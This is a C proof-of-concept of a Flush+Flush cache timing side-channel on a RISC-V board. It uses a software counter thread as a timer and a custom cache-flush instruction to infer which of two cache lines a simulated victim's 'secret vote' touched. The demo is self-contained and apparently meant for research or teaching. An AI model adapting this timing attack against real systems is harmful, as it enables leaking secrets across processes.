#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <assert.h>

#define PAGE_SIZE	0x1000
#define LINE_SIZE	64
#define LINE_A		2
#define LINE_B		15
char __attribute__((aligned(PAGE_SIZE))) my_buf[PAGE_SIZE] = {0};
#define votes_a		my_buf[LINE_A*LINE_SIZE+2]
#define votes_b		my_buf[LINE_B*LINE_SIZE+2]

static volatile int      counter_active = 1;
static volatile uint64_t sw_counter     = 0;

static void *counter_thread_fn(void *arg)
{
    (void)arg;

    /*
     * Optional: pin counter thread to hart-1 so it doesn't compete with the
     * attack thread on the same core.  Requires _GNU_SOURCE + -lpthread.
     */
#ifdef __linux__
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(1, &cpuset);          /* hart-1 on BeagleV-Ahead                */
    pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);
#endif

    while (counter_active) {
        sw_counter++;
        asm volatile("" ::: "memory");   /* prevent loop body removal       */
    }
    return NULL;
}

/*
 * Read the software counter with a RISC-V fence on both sides.
 * The fence ensures we don't reorder the load from sw_counter past the
 * probe_array access we are timing.
 */
static inline uint64_t read_counter(void)
{
    uint64_t v;
    asm volatile("fence" ::: "memory");
    v = sw_counter;
    asm volatile("fence" ::: "memory");
    return v;
}

static inline void flush(void *addr)
{
    asm volatile(
        "xor  a7, a7, a7   \n\t"
        "add  a7, a7, %0   \n\t"
        ".long 0x278800b   \n\t"     /* DCACHE.CIVA a7 */
        : : "r"(addr) : "a7", "memory"
    );
}

/*
 * RISC-V fence (RW/RW) — order all pending memory accesses.
 * Called after the flush loop and before the attack access so that all
 * cache-invalidation effects are visible before we proceed.
 */
static inline void fence(void)
{
    asm volatile("fence" ::: "memory");
}


void secret_vote(char candidate) {
    if (candidate == 'a')
    	votes_a++;
    else
	votes_b++;
}

inline void
access_memory(void* pointer) {
    volatile uint32_t value;
    asm volatile ("lw %0, 0(%1)\n\t"
	: "=r" (value)
	: "r" (pointer)
	);
}

int main(int argc, char* argv[]) {
    int SAMPLES = 10;
    size_t time_a = 0;
    size_t time_b = 0;

    pthread_t tid;
    if (pthread_create(&tid, NULL, counter_thread_fn, NULL) != 0) {
	perror("pthread_create");
	return 1;
    }

    /* Allow counter thread to reach steady-state speed                       */
    struct timespec ts = {0, 10000000L};   /* 10 ms                          */
    nanosleep(&ts, NULL);

    for (int i = 0; i < SAMPLES; i++) {
    	// 1. Flush
	flush(&votes_a);
	fence();

	flush(&votes_b);
	fence();

    	// 2. Victim executes
    	secret_vote('b');

    	// 3. Flush
	size_t start = read_counter();
	flush(&votes_a);
	fence();
	size_t end = read_counter();
	time_a += end - start;

	start = read_counter();
	flush(&votes_b);
	fence();
	end = read_counter();
	time_b += end - start;
    }
    counter_active = 0;
    pthread_join(tid, NULL);

    printf("Time for votes_a: %ld; Time for votes_b: %ld\n", time_a, time_b);
    printf("Average time for votes_a: %lu; Average time for votes_b: %lu\n", time_a/SAMPLES, time_b/SAMPLES);

    if (time_a > time_b)
	printf("Victim vote a\n");
    else
	printf("Victim vote b\n");

    return 0;
}
